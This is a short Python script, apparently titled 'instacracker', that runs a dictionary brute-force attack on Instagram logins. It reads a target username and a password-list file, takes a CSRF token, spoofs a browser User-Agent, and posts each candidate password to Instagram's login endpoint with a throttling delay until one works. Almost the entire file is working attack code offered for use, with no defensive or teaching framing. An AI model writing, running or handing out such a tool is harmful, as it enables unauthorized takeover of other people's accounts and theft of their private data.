import requests
import time
from colorama import Fore
from os import system

system("cls||clear")

print("""
 /$$                       /$$                                                       /$$                          
|__/                      | $$                                                      | $$                          
 /$$ /$$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$  /$$$$$$   /$$$$$$ 
| $$| $$__  $$ /$$_____/|_  $$_/   |____  $$ /$$_____/ /$$__  $$ |____  $$ /$$_____/| $$  /$$/ /$$__  $$ /$$__  $$
| $$| $$  \ $$|  $$$$$$   | $$      /$$$$$$$| $$      | $$  \__/  /$$$$$$$| $$      | $$$$$$/ | $$$$$$$$| $$  \__/
| $$| $$  | $$ \____  $$  | $$ /$$ /$$__  $$| $$      | $$       /$$__  $$| $$      | $$_  $$ | $$_____/| $$      
| $$| $$  | $$ /$$$$$$$/  |  $$$$/|  $$$$$$$|  $$$$$$$| $$      |  $$$$$$$|  $$$$$$$| $$ \  $$|  $$$$$$$| $$      
|__/|__/  |__/|_______/    \___/   \_______/ \_______/|__/       \_______/ \_______/|__/  \__/ \_______/|__/      
                                                                                                by: gupcoteles\n\n                               
""")

username = input(Fore.LIGHTYELLOW_EX + "username: ")
password_file_path = input(Fore.LIGHTYELLOW_EX + "password file path: ")
login_url = 'https://www.instagram.com/accounts/login/ajax/'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'X-Requested-With': 'XMLHttpRequest',
}

print("\n")

with requests.Session() as session:
    response = session.get('https://www.instagram.com/accounts/login/')

    if response.status_code != 200:
        print(Fore.LIGHTRED_EX + "First request failed:", response.status_code)
        print("Response content:", response.text)
    else:
        csrf_token = response.cookies.get('csrftoken')
        if not csrf_token:
            print(Fore.LIGHTRED_EX + "CSRF token not found.")
            exit(1)
        headers['X-CSRFToken'] = csrf_token

        with open(password_file_path.strip(), encoding="UTF-8") as password_file:
            for passw in password_file:
                payload = {
                    'username': username,
                    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:0:{passw.strip()}',
                }

                login_response = session.post(login_url, data=payload, headers=headers)

                try:
                    login_data = login_response.json()
                    if login_data.get('authenticated'):
                        print(Fore.LIGHTGREEN_EX + "Entry successful: " + Fore.LIGHTBLACK_EX + f"{passw.strip()}")
                        break
                    else:
                        print(Fore.LIGHTRED_EX + "wrong password: " + Fore.LIGHTBLACK_EX + f"{passw.strip()}")
                except ValueError:
                    print(Fore.LIGHTRED_EX + "Invalid response:", login_response.text)
                time.sleep(2)